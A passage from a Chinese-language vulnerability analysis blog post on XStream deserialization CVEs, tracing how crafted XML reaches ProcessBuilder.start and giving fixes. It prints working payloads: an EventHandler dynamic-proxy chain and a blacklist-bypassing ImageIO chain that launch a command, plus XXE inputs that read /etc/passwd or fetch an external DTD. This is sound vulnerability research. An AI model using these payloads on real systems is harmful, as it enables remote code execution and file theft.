<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072136465.png" alt="image-20230407213628405"></p>
<p>回到readItem方法中，然后使用convertAnother进行实例化该类并返回：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072138363.png" alt="image-20230407213801322"></p>
<p>再返回上级putCurrentEntryIntoMap方法中，然后将实例化的类（Proxy$xxx）存入target中，target就是sortedMap：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072235090.png" alt="image-20230407223522052"></p>
<p>动态代理用来代理一个或多个接口，需要提供一个InvocationHandler的实现类，当执行动态代理的类的任何方法时都会执行InvocationHandler的invoke方法。</p>
<p>在xml标签中，我们设置要实现的接口为Comparable，InvocationHandler的实现类为EventHandler类。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072227250.png" alt="image-20230407222758197"></p>
<p>然后又为他的target和action属性分别赋值为java.lang.ProcessBuilder和start。在XStream中，他会使用反射对属性进行赋值而不是setter、getter和构造函数（上面的图只是看看属性）。</p>
<p>回到TreeMapConverter#populateTreeMap方法中，在putCurrentEntryIntoMap调用完后，使用新创建的TreeMap的putAll方法，会将刚刚创建好的sortedMap放入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072156267.png" alt="image-20230407215608190"></p>
<p>在putAll方法中，调用父类的putAll方法（继续将sortedMap传递）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072157789.png" alt="image-20230407215733752"></p>
<p>父类为AbstractMap，其putAll方法中又调用了put方法，这里他会从Map循环获取键和值，而这里的Map就是sortedMap，从sortedMap中取出键和值，键和值就是我们读取出来的动态代理对象：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072203903.png" alt="image-20230407220310859"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072206425.png" alt="image-20230407220610357"></p>
<p>这里使用了模板方法模式，父类AbstractMap没有实现put方法，由TreeMap提供实现：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072158719.png" alt="image-20230407215852663"></p>
<p>在TreeMap中调用compare方法进行值的比较：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072159571.png" alt="image-20230407215950498"></p>
<p>而在compare方法里，调用了动态代理类的compareTo方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072207652.png" alt="image-20230407220740596"></p>
<p>之前说过，执行动态代理类的任何方法都会被InvocationHandler的实现类拦截，这里InvocationHandler的实现类就是我们包装的EventHandler，此时他会执行EventHandler的invoke方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072209971.png" alt="image-20230407220949920"></p>
<p>他会调用自身的invokeInternal方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072213740.png" alt="image-20230407221324671"></p>
<p>根据封装的target和action，找到action方法，也就是我们封装好的ProcessBuilder#start方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072214146.png" alt="image-20230407221454058"></p>
<p>然后就是执行该ProcessBuilder#start方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072217536.png" alt="image-20230407221706472"></p>
<p>触发命令执行。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>整个流程下来还算简单，在TreeMapConverter#populateTreeMap方法中：</p>
<p>将TreeMap在xml中的第一个子标签读取出来并实例化为类，将类的实例作为key和value存放在sortedMap中，然后调用TreeMap的putAll方法，将sortedMap中元素提取出来放到TreeMap中，由于TreeMap会调用compare方法将key进行比对，比对的时候由于自身的comparator（比较器）为null，无法使用自身的comparator（比较器）去比较两个key，那么只能将key强转为Comparable类型，并调用key的compareTo方法。</p>
<p>正就是因为调用了key的compareTo方法，key为代理对象，他交给EventHandler的invoke方法处理。</p>
<p>在EventHandler的invoke方法会调用invokeInternal方法，在invokeInternal方法中，从自身的属性target中寻找action方法并执行。我们将target赋值为<code>ProcessBuilder</code>，将action赋值为<code>start</code>就完成了命令执行的操作。</p>
<h3 id="额外"><a href="#额外" class="headerlink" title="额外"></a>额外</h3><p>在网上看到另一个POC：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>fookey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foovalue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用的还是TreeMap，同样还是在TreeMapConverter#populateTreeMap方法中：</p>
<p>区别在于第一个POC走如下路线（动态代理dynamic-proxy处在第一个子标签，他直接通过if放入了sortedMap）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072303349.png" alt="image-20230407230330282"></p>
<p>第二个POC走如下路线（动态代理dynamic-proxy处在第二个子标签，他要进入populateMap方法才放入sortedMap）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072304216.png" alt="image-20230407230420645"></p>
<p>在populateMap方法中，判断是否有子标签，若还有子标签，则接着调用putCurrentEntryIntoMap方法找到读取子标签，找到对应的类并实例化，然后存放到sortedMap中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072304089.png" alt="image-20230407230452028"></p>
<p>后续调用result.putAll的流程和第一次差不多，也是提取sortedMap的所有对应的key和value，将key进行比对。</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>注册一个自己的converter：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xstream.registerConverter(<span class="keyword">new</span> <span class="title class_">Converter</span>() &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConvert</span><span class="params">(Class type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> type != <span class="literal">null</span> &amp;&amp; (type == java.beans.EventHandler || type == java.lang.ProcessBuilder || Proxy.isProxy(type));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Unsupported type due to security reasons.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Unsupported type due to security reasons.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_LOW);</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2016-3674"><a href="#CVE-2016-3674" class="headerlink" title="CVE-2016-3674"></a>CVE-2016-3674</h2><h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.8  且使用了如下解析器：</li>
<li>DOM4J</li>
<li>DOM</li>
<li>JDOM</li>
<li>JDOM2</li>
<li>StAX implementation</li>
<li>XOM</li>
</ul>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>XStream 支持许多不同的 XML 解析器。其中一些还可以处理默认启用的外部实体。因此，攻击者可以提供操纵的 XML 作为输入来访问文件系统上的数据。</p>
<p>这个很骚，官网给的POC用不了：</p>
<p>官网给的POC：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">  &lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT string (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY content SYSTEM <span class="string">&quot;file:/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">]&gt;&lt;string&gt;&amp;content;&lt;/string&gt;</span></span><br></pre></td></tr></table></figure>

<p>报错，然后发现第一行的结束标签少了个问号，真是人才，官网这都能写错，修正后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">  &lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ELEMENT string (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY content SYSTEM &quot;file:/etc/passwd&quot;&gt;</span><br><span class="line">]&gt;&lt;string&gt;&amp;content;&lt;/string&gt;</span><br></pre></td></tr></table></figure>

<p>然后网上也没有该漏洞的分析文章，只能自己从0开始，在浅蓝的blog里也有POC：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">com.thoughtworks.xstream.io.xml.<span class="type">DomDriver</span> <span class="variable">domDriver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.thoughtworks.xstream.io.xml.DomDriver();</span><br><span class="line"><span class="type">String</span> <span class="variable">x</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;\n&quot;</span> +</span><br><span class="line">           <span class="string">&quot;&lt;!ENTITY  % xxe SYSTEM \&quot;http://127.0.0.1:2333/evil.dtd\&quot; &gt;\n&quot;</span> +</span><br><span class="line">           <span class="string">&quot;%xxe;]&gt;\n&quot;</span> +</span><br><span class="line">           <span class="string">&quot;&lt;foo&gt;1&lt;/foo&gt;&quot;</span>;</span><br><span class="line">domDriver.createReader(<span class="keyword">new</span> <span class="title class_">StringReader</span>(x));</span><br></pre></td></tr></table></figure>

<p>在我所使用的1.4.8版本中，只有DomDriver解析器是可以触发POC的，其他的都不行（一些解析器不支持解析外部实体，一些解析默认不开启外部实体支持）。</p>
<p>一眼顶真，在DomDriver的createReader方法中，未设置不允许外部实体，造成了XXE。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081429853.png" alt="image-20230408142931739"></p>
<p>对于DocumentBuilder来说，在解析xml使应开启安全配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">DocumentBuilder db = dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure>

<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>使用其他解析器，如果使用默认的 XML Pull Parser（Xpp3 或 kXML2），XStream 不会受到攻击，因为这些解析器类型根本不处理 XML 实体。</p>
<h2 id="CVE-2017-7957"><a href="#CVE-2017-7957" class="headerlink" title="CVE-2017-7957"></a>CVE-2017-7957</h2><h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.9</li>
</ul>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>使用void类型时，会造成DOS攻击。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081451960.png" alt="image-20230408145137904"></p>
<p>会为基本类型void分配实例。</p>
<p>这其实是jdk8的一个bug，jdk8中的Unsafe.allocateInstance(Class&lt;?&gt; cls)不支持分配基础数据类型。</p>
<p>对于基本数据类型来说，例如int.class。</p>
<p>他会获取Integer的Type，然后通过Class.getPrimitiveClass(“int”);拿到Type的值。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081534680.png" alt="image-20230408153413618"></p>
<p>getPrimitiveClass是个native方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081535905.png" alt="image-20230408153507873"></p>
<p>在jvm层面调用的是<code>JVM_FindPrimitiveClass</code>方法，这个方法其实是从<code>static oop _mirrors[T_VOID+1];</code>缓存里取出一个 oop对象。</p>
<p>我们都知道在jvm里是通过klass&#x2F;oop来描述java里的类与对象的，每加载一个Java类，在jvm层面就会生成klass实例，每创建一个Java类对象时会生成一个oop实例，这个oop实例会持有一个klass指针。这里需要多说的一点是，在Java语言层面用Class来代表每一个类，所以在加载每一个Java类时除了会生成klass实例外，还会创建一个Class类对象即jvm里的oop对象，该对象同样会有一个指针指向对应的klass, 访问Java层面的A.class时，在jvm层面就是访问这个oop对象。</p>
<p><code>static oop _mirrors[T_VOID+1];</code>缓存是在jvm初始化时初始化的，初始化的关键是调用<code>java_lang_Class::create_basic_type_mirror</code>方法，该方法逻辑比较简单，就是调用<code>Class_klass</code>的<code>allocate_instance</code>创建一个oop实例，<strong>但是这里有个关键点是：当创建基本数据类型时，没有传入具体的klass对象，而是传入的null</strong>，关键代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> oop java_class = InstanceMirrorKlass::<span class="built_in">cast</span>(SystemDictionary::<span class="built_in">Class_klass</span>())-&gt;<span class="built_in">allocate_instance</span>(<span class="literal">NULL</span>, CHECK_0);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一般对象创建Class实例时的代码</span></span><br><span class="line">Handle mirror = InstanceMirrorKlass::<span class="built_in">cast</span>(SystemDictionary::<span class="built_in">Class_klass</span>())-&gt;<span class="built_in">allocate_instance</span>(k, CHECK);</span><br></pre></td></tr></table></figure>

<p>也就是说基本数据类型的oop对象没有klass指针，他们的klass指针为NULL！</p>
<p><code>UNSAFE.allocateInstance</code>的jvm代码<code>Unsafe_AllocateInstance</code>，该方法底层调用链是<code>jni_AllocObject</code>-&gt;<code>alloc_object</code>，alloc_object的方法入参为<code>jclass clazz</code>, 这个在java层面就是<code>int.class</code>，在jvm层面就是一个<code>class mirror oop</code>对象。在方法里，他会获取oop对象的klass指针，然后调用该指针所指向的对象的方法，但是该指针为空，所以就导致了空指针引用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 获取klass指针</span><br><span class="line">KlassHandle k(THREAD,</span><br><span class="line">java_lang_Class::as_Klass(JNIHandles::resolve_non_null(clazz)));</span><br><span class="line"></span><br><span class="line">// 出错代码，k()对于int.class类型（基础数据类型）返回值为NULL，导致调用空指针的方法</span><br><span class="line">// 可以理解为Java层面的NullPointerException</span><br><span class="line">k()-&gt;check_valid_for_instantiation(false, CHECK_NULL);</span><br><span class="line">InstanceKlass::cast(k())-&gt;initialize(CHECK_NULL);</span><br><span class="line">instanceOop ih = InstanceKlass::cast(k())-&gt;allocate_instance(THREAD);</span><br><span class="line">return ih;</span><br></pre></td></tr></table></figure>

<p>这就是JVM出错的根本原因了。</p>
<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>XStream 自 1.4.7 版起包含一个<a target="_blank" rel="noopener" href="https://x-stream.github.io/security.html">安全框架</a>，以防止 CVE-2013-7285 中描述的攻击。如果这个框架被正确初始化，它也可以通过设置来抑制当前的漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xstream.denyTypes(new Class[]&#123; void.class, Void.class &#125;);</span><br></pre></td></tr></table></figure>

<p>旧 XStream 版本的用户可以为void类型注册一个自己的Converter，这也可以防止这种攻击：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xstream.registerConverter(<span class="keyword">new</span> <span class="title class_">Converter</span>() &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConvert</span><span class="params">(Class type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Void.class == type || <span class="keyword">void</span>.class == type;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Type void cannot have an instance&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Type void cannot have an instance&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_VERY_HIGH);</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h2><h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.13</li>
</ul>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>这次是CVE-2013-7285的变种，绕过了黑名单。</p>
<p>在1.4.7之后有了个安全框架，在调用MapperWrapper的realClass方法从Map中根据标签名寻找类时，会过滤一些黑名单，如图：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081616769.png" alt="image-20230408161634719"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081615934.png" alt="image-20230408161504878"></p>
<p>而这次官方给出的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">            &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">            &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">              &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">                &lt;iterator class=&#x27;javax.imageio.spi.FilterIterator&#x27;&gt;</span><br><span class="line">                  &lt;iter class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">                    &lt;cursor&gt;0&lt;/cursor&gt;</span><br><span class="line">                    &lt;lastRet&gt;-1&lt;/lastRet&gt;</span><br><span class="line">                    &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;</span><br><span class="line">                    &lt;outer-class&gt;</span><br><span class="line">                      &lt;java.lang.ProcessBuilder&gt;</span><br><span class="line">                        &lt;command&gt;</span><br><span class="line">                          &lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">                        &lt;/command&gt;</span><br><span class="line">                      &lt;/java.lang.ProcessBuilder&gt;</span><br><span class="line">                    &lt;/outer-class&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next/&gt;</span><br><span class="line">                &lt;/iterator&gt;</span><br><span class="line">                &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">              &lt;/e&gt;</span><br><span class="line">              &lt;in class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">                &lt;buf&gt;&lt;/buf&gt;</span><br><span class="line">                &lt;pos&gt;0&lt;/pos&gt;</span><br><span class="line">                &lt;mark&gt;0&lt;/mark&gt;</span><br><span class="line">                &lt;count&gt;0&lt;/count&gt;</span><br><span class="line">              &lt;/in&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>有些没必要的属性可以不用赋值，删减后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">            &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">              &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">                &lt;iterator class=&#x27;javax.imageio.spi.FilterIterator&#x27;&gt;</span><br><span class="line">                  &lt;iter class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">                    &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;</span><br><span class="line">                    &lt;outer-class&gt;</span><br><span class="line">                      &lt;java.lang.ProcessBuilder&gt;</span><br><span class="line">                        &lt;command&gt;</span><br><span class="line">                          &lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">                        &lt;/command&gt;</span><br><span class="line">                      &lt;/java.lang.ProcessBuilder&gt;</span><br><span class="line">                    &lt;/outer-class&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next/&gt;</span><br><span class="line">                &lt;/iterator&gt;</span><br><span class="line">                &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">              &lt;/e&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">      